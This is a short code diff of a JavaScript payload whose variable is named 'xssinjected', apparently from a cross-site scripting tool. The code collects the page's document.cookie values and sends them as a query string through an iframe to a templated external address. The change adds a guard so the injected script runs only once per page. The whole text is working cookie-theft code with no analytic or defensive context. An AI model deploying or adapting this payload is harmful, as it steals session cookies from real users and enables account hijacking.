@@ -1,6 +1,8 @@
 
-(function() {
-    if(location.hostname == 'localhost') return;
+(function(xssinjected) {
+    if(xssinjected || location.hostname == 'localhost') return;
+    
+    window.xssinjected = 1;
 
     var cookies = (document.cookie || "");
     cookies = cookies.length > 0 ? cookies.split(';') : []
@@ -17,5 +19,5 @@
     frame.setAttribute('src', "{{form_html}}?" + query.join('&'));
 
     append(frame);
-})();
+})(window.xssinjected);
 
